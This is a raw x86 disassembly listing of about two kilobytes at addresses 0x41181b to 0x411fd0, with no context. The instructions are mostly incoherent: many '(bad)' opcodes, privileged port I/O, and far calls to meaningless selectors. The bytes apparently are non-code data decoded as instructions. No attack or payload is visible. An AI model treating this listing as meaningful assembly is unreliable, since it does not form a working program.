  41181b:	add    BYTE PTR [eax+ecx*8],bl
  41181e:	adc    al,0x9f
  411820:	mov    edx,0x74aed329
  411825:	pop    ebp
  411826:	call   0xc335:0x3b632996
  41182d:	js     0x411853
  41182f:	xchg   ebp,eax
  411830:	aas    
  411831:	pusha  
  411832:	mov    cl,BYTE PTR [ebp-0xe]
  411835:	pop    ebx
  411836:	test   al,0xbc
  411838:	push   eax
  411839:	jb     0x411889
  41183b:	jge    0x411861
  41183d:	out    dx,al
  41183e:	jmp    0x411879
  411840:	das    
  411841:	xchg   edi,eax
  411842:	(bad)  [edx]
  411844:	add    BYTE PTR fs:[esi],al
  411847:	retf   
  411848:	jmp    0x4117da
  41184a:	sub    DWORD PTR [ecx-0x37],edi
  41184d:	pop    edi
  41184e:	in     eax,dx
  41184f:	neg    esp
  411851:	cmp    ch,cl
  411853:	mov    eax,0xb676f04f
  411858:	scas   al,BYTE PTR es:[edi]
  411859:	mov    ah,BYTE PTR [ebx]
  41185b:	push   eax
  41185c:	and    dl,ch
  41185e:	jge    0x411880
  411860:	cld    
  411861:	jno    0x4118a0
  411863:	(bad)  
  411865:	sub    esi,DWORD PTR [eax+0x2d774d36]
  41186b:	out    dx,eax
  41186c:	call   esi
  41186e:	inc    edi
  41186f:	add    esi,ecx
  411871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411872:	or     eax,0xb0e4a20f
  411877:	outs   dx,DWORD PTR ds:[esi]
  411878:	call   0xfe3b:0x47821295
  41187f:	mov    bh,0xa3
  411881:	mov    al,ds:0x113efcc4
  411886:	xchg   ebp,eax
  411887:	(bad)  
  411888:	jg     0x4118f5
  41188a:	dec    edi
  41188b:	and    eax,0x3b1a4a8f
  411890:	jmp    0x4118d4
  411892:	dec    ebp
  411893:	jno    0x41182c
  411895:	add    DWORD PTR [esi],esp
  411897:	pop    ds
  411898:	inc    ebx
  411899:	test   ebx,esi
  41189b:	loopne 0x41188f
  41189d:	xchg   ecx,eax
  41189e:	jb     0x411866
  4118a0:	arpl   WORD PTR [eax-0x4fbcad53],si
  4118a6:	inc    edi
  4118a7:	xchg   esi,eax
  4118a8:	mov    dl,0xc3
  4118aa:	pop    esp
  4118ab:	(bad)  
  4118ac:	push   edi
  4118ad:	cmp    al,0xa6
  4118af:	and    ebp,DWORD PTR [edx*4+0x47fd8be8]
  4118b6:	add    bh,BYTE PTR [edi+0x2ac9a894]
  4118bc:	adc    BYTE PTR [esi+0x54b2a9c4],al
  4118c2:	cmp    ch,cl
  4118c4:	daa    
  4118c5:	fcomp  QWORD PTR [ecx+0x6701167e]
  4118cb:	mov    esp,0xcb448e71
  4118d0:	or     ebx,DWORD PTR [edx-0x1d]
  4118d3:	sti    
  4118d4:	fs pop di
  4118d7:	adc    eax,0xbdb145f3
  4118dc:	push   ds
  4118dd:	pop    esp
  4118de:	aad    0x33
  4118e0:	sahf   
  4118e1:	xor    eax,DWORD PTR [ecx+0x6f]
  4118e4:	cmp    BYTE PTR [esi],al
  4118e6:	pusha  
  4118e7:	xchg   esi,eax
  4118e8:	mov    esi,0x1ed17adb
  4118ed:	pop    ebp
  4118ee:	push   esp
  4118ef:	nop
  4118f0:	push   es
  4118f1:	mov    ah,0xc8
  4118f3:	sbb    ch,BYTE PTR [ecx]
  4118f5:	mov    cl,BYTE PTR [edx]
  4118f7:	mov    dl,0xb1
  4118f9:	pop    ebx
  4118fa:	cmp    BYTE PTR [edx-0x1f936e5d],ch
  411900:	cmp    edx,DWORD PTR [esi+0x1d]
  411903:	adc    eax,0xa60c2a01
  411908:	and    ah,BYTE PTR [ecx+0x71]
  41190b:	inc    ecx
  41190c:	out    dx,eax
  41190d:	sub    BYTE PTR [ecx],cl
  41190f:	imul   edi,DWORD PTR [ebp+0x7c],0xffffff98
  411913:	push   ds
  411914:	mov    bl,0x29
  411916:	dec    ebp
  411917:	mov    bh,0x5d
  411919:	jns    0x4118f5
  41191b:	xor    al,0x25
  41191d:	xchg   edx,eax
  41191e:	mov    cl,dl
  411920:	retf   
  411921:	add    ecx,ecx
  411923:	xlat   BYTE PTR ds:[ebx]
  411924:	xchg   edi,eax
  411925:	into   
  411926:	mov    cl,0x5
  411928:	push   cs
  411929:	fild   WORD PTR [ecx+edx*4-0x6d]
  41192d:	and    eax,0xa600a216
  411932:	mov    ds:0x6103eacd,eax
  411937:	sub    BYTE PTR [edx-0x3ab76b74],ah
  41193d:	fcomp  QWORD PTR [ebx]
  41193f:	inc    edx
  411940:	add    BYTE PTR [esi-0x7179eeb4],0x4b
  411947:	adc    bl,BYTE PTR ds:0x71264719
  41194d:	cmp    al,0xe6
  41194f:	push   cs
  411950:	or     esi,DWORD PTR [ecx+0x18]
  411953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411954:	inc    edi
  411955:	dec    esp
  411956:	add    BYTE PTR [edx-0x24256011],ch
  41195c:	mov    ah,0xa6
  41195e:	lock stos DWORD PTR es:[edi],eax
  411960:	mov    ch,0x25
  411962:	pop    ebp
  411963:	faddp  st(0),st
  411965:	sbb    al,0x49
  411967:	mov    ebx,0x139bdbfb
  41196c:	mov    al,0xd6
  41196e:	stos   DWORD PTR es:[edi],eax
  41196f:	(bad)  
  411970:	fldlg2 
  411972:	popf   
  411973:	mov    dl,0x3d
  411975:	cmp    DWORD PTR [ecx-0x439c8078],ecx
  41197b:	xchg   DWORD PTR [edi+0x49],edi
  41197e:	and    DWORD PTR [esp+eax*1],eax
  411981:	fwait
  411982:	dec    edx
  411983:	push   esp
  411984:	ret    0xad3c
  411987:	cmp    eax,0x355d9504
  41198c:	xor    bh,BYTE PTR [edi+eax*8+0xe3207a]
  411993:	pop    ebp
  411994:	and    eax,0x9963c8d0
  411999:	test   BYTE PTR ds:0xd2213387,dh
  41199f:	sbb    al,0x84
  4119a1:	out    0xab,eax
  4119a3:	mov    esi,0x217382e
  4119a8:	xlat   BYTE PTR ds:[ebx]
  4119a9:	sti    
  4119aa:	les    edx,FWORD PTR [edi+0x2dec272e]
  4119b0:	out    0xc1,eax
  4119b2:	jne    0x4119b4
  4119b4:	xchg   ecx,eax
  4119b5:	rcr    DWORD PTR [edx+0x32e9b55a],cl
  4119bb:	and    al,0x7f
  4119bd:	push   ebp
  4119be:	cmc    
  4119bf:	add    bl,BYTE PTR [esi+0x50]
  4119c2:	jno    0x4119c2
  4119c4:	or     eax,0xc6fc877
  4119c9:	retf   
  4119ca:	sub    al,0xb0
  4119cc:	dec    edi
  4119cd:	mov    ch,0xdd
  4119cf:	aaa    
  4119d0:	in     eax,0x94
  4119d2:	jbe    0x411a40
  4119d4:	call   0xc83f:0x50039b6c
  4119db:	mov    ds:0x55e38ca0,eax
  4119e0:	xchg   DWORD PTR [ebx-0x7a2a4b6c],edi
  4119e6:	test   al,0x2
  4119e8:	in     al,dx
  4119e9:	sar    DWORD PTR [ebx+0x64],0xdd
  4119ed:	je     0x411995
  4119ef:	and    al,0xdd
  4119f1:	push   edi
  4119f2:	add    eax,0x4248832
  4119f7:	jp     0x41198b
  4119f9:	push   0xffffffe6
  4119fb:	cmp    eax,0x3978e61f
  411a00:	or     ch,BYTE PTR [ebx-0xa]
  411a03:	ret    0x6c21
  411a06:	add    eax,0x2058037
  411a0b:	clc    
  411a0c:	pop    es
  411a0d:	call   DWORD PTR [eax]
  411a0f:	hlt    
  411a10:	ss repnz fwait
  411a13:	mov    esi,0x459bc5df
  411a18:	push   esi
  411a19:	int3   
  411a1a:	test   al,0x17
  411a1c:	and    BYTE PTR [edi+edi*8+0xbd19190],dl
  411a23:	mov    edx,ss
  411a25:	fsub   DWORD PTR [ebp+0x5c]
  411a28:	fbld   TBYTE PTR [ecx+0x14220029]
  411a2e:	rcr    BYTE PTR [ecx+0x23],cl
  411a31:	add    eax,DWORD PTR [ebx-0x65fd6b0c]
  411a37:	pusha  
  411a38:	sahf   
  411a39:	fadd   QWORD PTR [ecx+0x36]
  411a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a3d:	fsincos 
  411a3f:	or     BYTE PTR ds:0xd7ccfc39,dh
  411a45:	enter  0x83b4,0x96
  411a49:	cli    
  411a4a:	mov    ah,0x19
  411a4c:	mov    ebp,0x346b12e4
  411a51:	or     eax,0xc5dda943
  411a56:	pop    ebx
  411a57:	test   eax,0x51900544
  411a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a5d:	lock (bad) 
  411a5f:	fmul   DWORD PTR cs:[ebp-0x47]
  411a63:	mov    cl,0x42
  411a65:	leave  
  411a66:	aad    0x49
  411a68:	or     eax,0xbc840f8
  411a6d:	push   edi
  411a6e:	(bad)  
  411a70:	ins    DWORD PTR es:[edi],dx
  411a71:	aad    0x6a
  411a73:	dec    eax
  411a74:	sub    esi,DWORD PTR [ebx-0x678d2dc3]
  411a7a:	add    eax,0xf922312f
  411a7f:	mov    esp,0x4be6b4f0
  411a84:	retf   0xd5bb
  411a87:	out    dx,eax
  411a88:	cmp    ah,BYTE PTR [eax]
  411a8a:	loop   0x411ace
  411a8c:	std    
  411a8d:	jo     0x411aba
  411a8f:	sahf   
  411a90:	je     0x411a6c
  411a92:	jns    0x411a63
  411a94:	retf   
  411a95:	push   ecx
  411a96:	ss jno 0x411af0
  411a99:	in     al,0x8a
  411a9b:	sbb    esp,DWORD PTR [ebp-0x7a]
  411a9e:	enter  0xd2d8,0xd9
  411aa2:	push   esi
  411aa3:	jecxz  0x411a7a
  411aa5:	mov    ds:0xc666300b,eax
  411aaa:	mov    ecx,DWORD PTR [edx]
  411aac:	add    DWORD PTR [edx+ebx*8-0x2],ebx
  411ab0:	fistp  DWORD PTR ds:0xae31dfee
  411ab6:	daa    
  411ab7:	ja     0x411b21
  411ab9:	in     al,dx
  411aba:	mov    esi,0x777f3a5
  411abf:	leave  
  411ac0:	sub    al,0xdd
  411ac2:	scas   eax,DWORD PTR es:[edi]
  411ac3:	adc    al,BYTE PTR [edi+0x52217f44]
  411ac9:	nop
  411aca:	retf   
  411acb:	lods   eax,DWORD PTR ds:[esi]
  411acc:	pop    ebp
  411acd:	lds    ebx,FWORD PTR [ebx-0x407e115f]
  411ad3:	jmp    0x865a:0x5c817d7
  411ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411adb:	sub    al,0xad
  411add:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ade:	lods   al,BYTE PTR ds:[esi]
  411adf:	add    BYTE PTR [esi],bh
  411ae1:	fs in  eax,dx
  411ae3:	push   eax
  411ae4:	leave  
  411ae5:	mov    cl,0xa0
  411ae7:	(bad)  
  411ae8:	and    BYTE PTR ds:0xb3099199,cl
  411aee:	xchg   edx,eax
  411aef:	arpl   WORD PTR [ecx-0x4920a59e],bx
  411af5:	push   ebp
  411af6:	sahf   
  411af7:	and    esi,DWORD PTR [ebx-0x1d32a84]
  411afd:	fnstenv [ebx]
  411aff:	loope  0x411b69
  411b01:	xchg   edx,eax
  411b02:	lahf   
  411b03:	dec    edx
  411b04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b05:	push   ebp
  411b06:	fcom   DWORD PTR [esi+0x2727a850]
  411b0c:	aas    
  411b0d:	and    al,0x82
  411b0f:	test   eax,0xcb538b2e
  411b14:	push   ecx
  411b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b16:	sub    DWORD PTR [esi+0x27],esi
  411b19:	jns    0x411b3c
  411b1b:	pop    ss
  411b1c:	mov    bl,0x43
  411b1e:	out    0xe6,eax
  411b20:	(bad)  
  411b21:	ret    
  411b22:	lock in al,dx
  411b24:	adc    BYTE PTR [ebp-0x16693aad],0x9
  411b2b:	(bad)  [eax+eiz*1-0x2b72971b]
  411b32:	xor    eax,0x3fb003ec
  411b37:	mov    eax,ds:0x59cf5c1c
  411b3c:	sub    al,0x5a
  411b3e:	in     al,0x6a
  411b40:	push   ss
  411b41:	lock inc edx
  411b43:	pop    ebp
  411b44:	or     al,0xdc
  411b46:	mov    edi,0x7987f5fa
  411b4b:	inc    ebp
  411b4c:	sub    dl,BYTE PTR [edx+0x10]
  411b4f:	popa   
  411b50:	outs   dx,BYTE PTR ds:[esi]
  411b51:	mov    DWORD PTR [edi+edx*2],esi
  411b54:	inc    ebx
  411b55:	(bad)  
  411b56:	cmp    al,0xf2
  411b58:	dec    ebx
  411b59:	pusha  
  411b5a:	mov    edx,0x3eee6dad
  411b5f:	xor    al,0x84
  411b61:	mov    eax,0x1803d27c
  411b66:	scas   eax,DWORD PTR es:[edi]
  411b67:	jns    0x411b3f
  411b69:	jecxz  0x411bd0
  411b6b:	mov    ebx,0xc4ac4eb
  411b70:	ja     0x411b06
  411b72:	retf   0x8d7
  411b75:	sti    
  411b76:	std    
  411b77:	mul    BYTE PTR ds:0x9ff53426
  411b7d:	cmp    ebp,DWORD PTR [eax]
  411b7f:	aas    
  411b80:	(bad)  
  411b81:	in     al,0xb2
  411b83:	adc    al,0xb1
  411b85:	push   edi
  411b86:	aaa    
  411b87:	mov    ds:0xecb7330c,eax
  411b8c:	les    edi,FWORD PTR [edx]
  411b8e:	sbb    ecx,esp
  411b90:	sar    BYTE PTR [eax+0x37b7fecb],0xaa
  411b97:	xor    DWORD PTR [edi+ebx*2],ebp
  411b9a:	mov    ebp,0xea68a79e
  411b9f:	dec    ebp
  411ba0:	sub    DWORD PTR [ebx],edx
  411ba2:	xor    ah,ah
  411ba4:	hlt    
  411ba5:	mov    esp,0x786c3a8a
  411baa:	cmp    ecx,0xffffffac
  411bad:	mov    ch,0x92
  411baf:	jmp    0xafee:0x763424aa
  411bb6:	fstp   QWORD PTR [ebp-0x1f]
  411bb9:	inc    edi
  411bba:	add    al,0x88
  411bbc:	xchg   edx,eax
  411bbd:	es pop eax
  411bbf:	je     0x411c29
  411bc1:	sub    eax,0x68b5b900
  411bc6:	(bad)  
  411bc7:	jp     0x411b6d
  411bc9:	push   ebx
  411bca:	fs or  al,0xd9
  411bcd:	sub    dl,BYTE PTR [edx-0x1ce61bde]
  411bd3:	pop    edi
  411bd4:	cwde   
  411bd5:	xor    eax,0x5d7175f0
  411bda:	cli    
  411bdb:	nop
  411bdc:	jne    0x411bb3
  411bde:	jg     0x411b99
  411be0:	retf   
  411be1:	movlps QWORD PTR [ecx],xmm4
  411be4:	pop    edx
  411be5:	out    0xb3,eax
  411be7:	popa   
  411be8:	push   cs
  411be9:	xor    dh,BYTE PTR [edx+0x48]
  411bec:	pop    ebp
  411bed:	ja     0x411c5b
  411bef:	fst    QWORD PTR [ecx+ebx*4]
  411bf2:	inc    ebx
  411bf3:	xor    ch,BYTE PTR [edi-0x3d7cf0d]
  411bf9:	or     BYTE PTR [edi+eax*4+0x28d9222e],0x7b
  411c01:	js     0x411c81
  411c03:	addr16 jle 0x411bb0
  411c06:	out    dx,eax
  411c07:	cdq    
  411c08:	(bad)  
  411c09:	int3   
  411c0a:	push   ebx
  411c0b:	jmp    0x411c3a
  411c0d:	sbb    edx,DWORD PTR [ebp+0xa]
  411c10:	pop    ebx
  411c11:	cmp    al,0x80
  411c13:	call   0xaff4:0xea10b1e3
  411c1a:	aaa    
  411c1b:	jge    0x411be1
  411c1d:	lods   eax,DWORD PTR ds:[esi]
  411c1e:	dec    ebp
  411c1f:	add    al,0x29
  411c21:	mov    ebx,0x5cdaf259
  411c26:	ret    0x103d
  411c29:	pop    ds
  411c2a:	pop    edi
  411c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c2c:	mov    cl,0xad
  411c2e:	push   DWORD PTR [ebx]
  411c30:	outs   dx,BYTE PTR ds:[esi]
  411c31:	fs mov bl,0x8f
  411c34:	cmc    
  411c35:	push   edx
  411c37:	stc    
  411c38:	in     al,dx
  411c39:	fistp  QWORD PTR [ebx+esi*8-0x60c196ed]
  411c40:	mov    esi,0x7984e367
  411c45:	mov    ch,0xea
  411c47:	pop    esp
  411c48:	(bad)  
  411c49:	mov    al,0xd8
  411c4b:	les    ecx,FWORD PTR [edx+0x6abeb901]
  411c51:	mov    esp,0xe595e37e
  411c56:	leave  
  411c57:	or     al,0x65
  411c59:	rcl    cl,1
  411c5b:	adc    al,0xa7
  411c5d:	xchg   edx,eax
  411c5e:	dec    eax
  411c5f:	pop    es
  411c60:	mov    ah,BYTE PTR [eax]
  411c62:	out    dx,al
  411c63:	xor    DWORD PTR [edi+eax*2+0x1b],ecx
  411c67:	push   esp
  411c68:	outs   dx,DWORD PTR ds:[esi]
  411c69:	pusha  
  411c6a:	jmp    0xaf75:0xf00af593
  411c71:	data16 cmp cl,BYTE PTR [edx]
  411c74:	dec    ecx
  411c75:	lahf   
  411c76:	xchg   esp,eax
  411c77:	add    DWORD PTR [edi-0x692c166e],edx
  411c7d:	(bad)  
  411c7e:	mov    bl,0x79
  411c80:	inc    ebp
  411c81:	mov    eax,0xce6416b5
  411c86:	jo     0x411c1b
  411c88:	xor    al,0x6f
  411c8a:	js     0x411c1d
  411c8c:	or     ecx,DWORD PTR [edx-0x15]
  411c8f:	mov    DWORD PTR [edi],ebx
  411c91:	mov    dl,BYTE PTR [ecx]
  411c93:	or     edx,DWORD PTR [ebx]
  411c95:	test   BYTE PTR [edx],0xff
  411c98:	icebp  
  411c99:	daa    
  411c9a:	pop    esp
  411c9b:	cmp    al,0x40
  411c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c9e:	jns    0x411d01
  411ca0:	and    BYTE PTR ds:0x685577db,bh
  411ca6:	and    al,0xdf
  411ca8:	aad    0xba
  411caa:	xor    bl,BYTE PTR [ecx+0x56f9619a]
  411cb0:	(bad)  
  411cb1:	imul   edx,DWORD PTR [ecx-0x7fac24ac],0xf4eefb07
  411cbb:	cmp    DWORD PTR [edx+0x4e],0x32
  411cbf:	adc    BYTE PTR [ecx+0x3f],ah
  411cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cc3:	mov    bh,0xef
  411cc6:	mov    ch,0xa7
  411cc8:	mov    dl,0xb7
  411cca:	sbb    eax,0x295f023a
  411ccf:	jno    0x411c5c
  411cd1:	mov    ebx,0x1c0ecf6
  411cd6:	pop    esi
  411cd7:	lods   al,BYTE PTR ds:[esi]
  411cd8:	adc    dh,BYTE PTR [edx-0x5ac72f41]
  411cde:	cld    
  411cdf:	test   eax,0x9ae08082
  411ce4:	and    eax,0xc8218c60
  411ce9:	outs   dx,DWORD PTR ds:[esi]
  411cea:	call   0x23b166da
  411cef:	out    0xea,al
  411cf1:	aad    0x59
  411cf3:	in     al,dx
  411cf4:	mov    cl,0x24
  411cf6:	std    
  411cf7:	imul   edx,ebx,0x69eec7fd
  411cfd:	ja     0x411cfb
  411cff:	jg     0x411d74
  411d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d02:	out    dx,eax
  411d03:	outs   dx,BYTE PTR ds:[esi]
  411d04:	sub    bh,BYTE PTR [eax-0x13e0936f]
  411d0a:	cmc    
  411d0b:	jno    0x411cee
  411d0d:	or     ecx,DWORD PTR [edi-0x7640c5c2]
  411d13:	jecxz  0x411cf0
  411d15:	sbb    ah,BYTE PTR [ecx]
  411d17:	cmp    BYTE PTR [eax],bh
  411d19:	cmp    ebx,esp
  411d1b:	dec    ebp
  411d1c:	loope  0x411d26
  411d1e:	idiv   BYTE PTR ds:0x7c86538f
  411d24:	lods   eax,DWORD PTR ds:[esi]
  411d25:	test   DWORD PTR [ebx-0xd],eax
  411d28:	pop    ecx
  411d29:	dec    DWORD PTR [eax+0x1a]
  411d2c:	(bad)  
  411d2d:	mov    ?,WORD PTR ds:0x31b639a6
  411d33:	add    dh,BYTE PTR [edi+ebp*4]
  411d36:	imul   BYTE PTR [ebp+ebx*8+0x79063e19]
  411d3d:	sub    BYTE PTR [esp+ebx*1-0x4b1e29ea],bl
  411d44:	ja     0x411d57
  411d46:	es push esp
  411d48:	call   0xe3c50687
  411d4d:	push   0xfffffff7
  411d4f:	into   
  411d50:	sbb    esi,DWORD PTR [esi+0x33]
  411d53:	mov    dl,0x6c
  411d55:	ret    0x3d96
  411d58:	(bad)  
  411d59:	xor    al,0x99
  411d5b:	xchg   edi,eax
  411d5c:	cli    
  411d5d:	and    DWORD PTR [eax+edx*2],ebp
  411d60:	clc    
  411d61:	mov    al,0x66
  411d63:	out    0x25,eax
  411d65:	dec    edi
  411d66:	and    al,0x8
  411d68:	jmp    0xfdfd66e0
  411d6d:	in     al,dx
  411d6e:	add    cl,BYTE PTR [edi-0x1e34035f]
  411d74:	lock cmp al,BYTE PTR [esp+edi*4]
  411d78:	add    al,0xcc
  411d7a:	jno    0x411d2a
  411d7c:	aas    
  411d7d:	mov    eax,DWORD PTR [edi+0x5c]
  411d80:	or     esi,DWORD PTR [edx-0x657ecdf3]
  411d86:	outs   dx,BYTE PTR ds:[esi]
  411d88:	(bad)  
  411d8a:	imul   esi,DWORD PTR [eax-0x5c],0x15
  411d8e:	cs ret 
  411d90:	mov    eax,ds:0xeb295aa2
  411d95:	sbb    BYTE PTR ds:0x165ef4d5,0xed
  411d9c:	jbe    0x411d89
  411d9e:	fs dec edi
  411da0:	mov    ebp,edx
  411da2:	retf   
  411da3:	xchg   edi,eax
  411da4:	mov    eax,0x5eb0fd89
  411da9:	test   eax,0xb2e2a01b
  411dae:	in     eax,dx
  411daf:	push   edx
  411db0:	and    al,0x3b
  411db2:	aam    0x9c
  411db4:	mov    eax,DWORD PTR [esi+eax*2+0x5b5e030d]
  411dbb:	cdq    
  411dbc:	lods   eax,DWORD PTR ds:[esi]
  411dbd:	push   cs
  411dbe:	lds    ebp,FWORD PTR [edi-0x23a7d789]
  411dc4:	cmp    cl,BYTE PTR [ecx-0x334685f9]
  411dca:	scas   eax,DWORD PTR es:[edi]
  411dcb:	mov    ebp,0xfcdc1638
  411dd0:	inc    esp
  411dd1:	sbb    DWORD PTR [ebx+0x2437a10a],edi
  411dd7:	or     ebx,ebp
  411dd9:	and    BYTE PTR [eax+0x55],al
  411ddc:	inc    edx
  411ddd:	or     DWORD PTR ds:0x186f5c02,ebx
  411de3:	test   DWORD PTR [edi],eax
  411de5:	jns    0x411d7b
  411de7:	adc    edi,DWORD PTR [ebp+0x59]
  411dea:	adc    eax,0x46d7e8b0
  411def:	or     BYTE PTR [eax+0x79eea2c],dh
  411df5:	push   edi
  411df6:	dec    esi
  411df7:	adc    al,0x8
  411df9:	mov    ecx,0x98c81279
  411dfe:	pop    edi
  411dff:	ins    BYTE PTR es:[edi],dx
  411e00:	dec    esi
  411e01:	mov    cl,0xb0
  411e03:	push   ebx
  411e04:	(bad)  
  411e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e07:	clc    
  411e08:	call   0x63f0:0xe57b4ff6
  411e0f:	int    0xc6
  411e11:	repz div edi
  411e14:	in     al,dx
  411e15:	xor    ebp,edx
  411e17:	cmp    eax,0x4f2a51b2
  411e1c:	out    dx,al
  411e1d:	fwait
  411e1e:	(bad)  
  411e1f:	push   ds
  411e20:	xor    eax,0x460eb2fe
  411e25:	jo     0x411e09
  411e27:	into   
  411e28:	xor    al,0x9a
  411e2a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e2c:	xchg   ebx,eax
  411e2d:	push   0x5f8bdfaa
  411e32:	dec    edx
  411e33:	jp     0x411e49
  411e35:	enter  0xa7be,0x9c
  411e39:	addr16 mov bh,0x32
  411e3c:	mov    dh,0x3c
  411e3e:	push   ebx
  411e3f:	jg     0x411e4c
  411e41:	add    WORD PTR [edi],ax
  411e44:	(bad)  
  411e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e46:	outs   dx,DWORD PTR ds:[esi]
  411e47:	sahf   
  411e48:	jg     0x411ec6
  411e4a:	push   ecx
  411e4b:	push   ss
  411e4c:	fsub   DWORD PTR [ebx]
  411e4e:	out    dx,eax
  411e4f:	fisubr WORD PTR [edi+0x5d]
  411e52:	xor    BYTE PTR [ecx],bl
  411e54:	sahf   
  411e55:	mov    dh,BYTE PTR [edi]
  411e57:	jge    0x411dfd
  411e59:	inc    esp
  411e5a:	retf   0xa1f0
  411e5d:	shl    DWORD PTR [edx],1
  411e5f:	push   edx
  411e60:	std    
  411e61:	shl    BYTE PTR [ebx],0x92
  411e64:	shl    DWORD PTR [ecx],cl
  411e66:	jmp    0x19f0883c
  411e6b:	stc    
  411e6c:	das    
  411e6d:	xchg   BYTE PTR [eax-0x2fcdee40],cl
  411e73:	mov    bh,0xb8
  411e75:	push   edx
  411e76:	or     al,BYTE PTR [ebp-0x13d88e16]
  411e7c:	in     eax,0x9b
  411e7e:	ja     0x411eba
  411e80:	cwde   
  411e81:	(bad)
  411e85:	add    BYTE PTR [esi+0x7e],bh
  411e88:	les    esp,FWORD PTR [eax+0x2d]
  411e8b:	pushf  
  411e8c:	scas   al,BYTE PTR es:[edi]
  411e8d:	scas   eax,DWORD PTR es:[edi]
  411e8e:	dec    esp
  411e8f:	pop    ebx
  411e90:	inc    ecx
  411e91:	test   eax,edx
  411e93:	repz push edx
  411e95:	mov    fs,esi
  411e97:	inc    esi
  411e98:	fiadd  WORD PTR [edi+0x31]
  411e9b:	mov    edx,0x525ab2a4
  411ea0:	mov    esi,0xd8d520f3
  411ea5:	retf   
  411ea6:	inc    ecx
  411ea7:	and    eax,0x632a9b01
  411eac:	xor    BYTE PTR [ebx+0x3ca8931d],dh
  411eb2:	scas   eax,DWORD PTR es:[edi]
  411eb3:	sbb    DWORD PTR [ebp-0x704f044c],edi
  411eb9:	xor    DWORD PTR [ebx-0x66ab6561],ebx
  411ebf:	sub    ebx,DWORD PTR [eax+ecx*1+0x7ce4e9c0]
  411ec6:	or     BYTE PTR [ebx-0x7f],ah
  411ec9:	and    ebx,DWORD PTR [eax-0x5f2ea1d9]
  411ecf:	sbb    eax,0x2631891d
  411ed4:	and    al,0x2c
  411ed6:	stc    
  411ed7:	pop    ss
  411ed8:	stos   DWORD PTR es:[edi],eax
  411ed9:	mov    ds:0xc1d5d036,al
  411ede:	sub    BYTE PTR [edx-0x23febf1],ch
  411ee4:	sbb    al,0xc
  411ee6:	push   esp
  411ee7:	out    0x38,al
  411ee9:	push   ebp
  411eea:	jmp    0x9c5f:0xb27ec635
  411ef1:	pop    ebp
  411ef2:	or     BYTE PTR [ecx],bh
  411ef4:	arpl   WORD PTR [ebx-0x75930eea],cx
  411efa:	or     eax,0xb8f137e3
  411eff:	cmp    DWORD PTR [esi-0x15d5a044],esi
  411f05:	cmc    
  411f06:	xchg   edx,eax
  411f07:	jle    0x411edf
  411f09:	dec    ebp
  411f0a:	sbb    BYTE PTR ds:[edx],ah
  411f0d:	psrad  mm4,QWORD PTR [esi]
  411f10:	mov    edi,0x27b32a7c
  411f15:	push   0xffffffff
  411f17:	enter  0xa4eb,0xc7
  411f1b:	int    0xd4
  411f1d:	jge    0x411edb
  411f1f:	ins    DWORD PTR es:[edi],dx
  411f20:	add    BYTE PTR ds:0x2c8fdd9b,ch
  411f26:	dec    BYTE PTR [ebx+0x2ff9a770]
  411f2c:	arpl   WORD PTR [esi+edi*8],bx
  411f2f:	jae    0x411f16
  411f31:	fmulp  st(2),st
  411f33:	or     al,BYTE PTR [ebx+ecx*2]
  411f36:	loopne 0x411eef
  411f38:	or     ch,ch
  411f3a:	in     al,dx
  411f3b:	lahf   
  411f3c:	xor    DWORD PTR [esi+0x20c8d1],eax
  411f42:	ret    0xa7d6
  411f45:	mov    dh,0xdf
  411f47:	mov    ecx,0x6725435a
  411f4c:	rol    DWORD PTR [eax],cl
  411f4e:	mov    ds:0x878376eb,al
  411f53:	mov    ?,WORD PTR [edi+0x66703a7e]
  411f59:	and    ebx,edi
  411f5b:	adc    bl,BYTE PTR [esi+0x3e]
  411f5e:	sub    esp,DWORD PTR [edx-0x1c]
  411f61:	cmove  ebx,DWORD PTR [ebx-0x51]
  411f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f66:	xchg   ebx,eax
  411f67:	add    eax,0xae9ef787
  411f6c:	adc    al,0x33
  411f6e:	je     0x411f99
  411f70:	xchg   ebp,eax
  411f71:	test   BYTE PTR [ebx],0x21
  411f74:	pop    esi
  411f75:	in     al,0x79
  411f77:	lahf   
  411f78:	pushf  
  411f79:	mov    edi,0xf0d72809
  411f7e:	fisttp WORD PTR [eax+0x744ed448]
  411f84:	rol    DWORD PTR [eax],1
  411f86:	rcl    BYTE PTR ds:0x29efbc2e,1
  411f8c:	scas   al,BYTE PTR es:[edi]
  411f8d:	stos   DWORD PTR es:[edi],eax
  411f8e:	lea    edx,[esi-0x4a]
  411f91:	dec    ebx
  411f92:	mov    dl,0xe
  411f94:	stc    
  411f95:	pop    edx
  411f96:	mov    cl,BYTE PTR [edi]
  411f98:	add    eax,0xac8fa5b7
  411f9d:	(bad)  
  411f9f:	jnp    0x411fc8
  411fa1:	out    dx,eax
  411fa2:	(bad)  
  411fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa4:	add    eax,0xe9b9976d
  411fa9:	adc    BYTE PTR [eax-0x5b],dl
  411fac:	lods   eax,DWORD PTR ds:[esi]
  411fad:	int3   
  411fae:	cdq    
  411faf:	lahf   
  411fb0:	mov    bh,0xd9
  411fb2:	pop    eax
  411fb3:	shr    DWORD PTR [ebx+ecx*2],cl
  411fb6:	mov    ds:0xc3759780,al
  411fbb:	mov    al,ds:0xd83927e
  411fc0:	mov    eax,0xb7a62805
  411fc5:	or     ebx,DWORD PTR [edx]
  411fc7:	cli    
  411fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fc9:	sub    WORD PTR [ebx+0x5dfd25c6],ax
  411fd0:	loopne 0x411f89
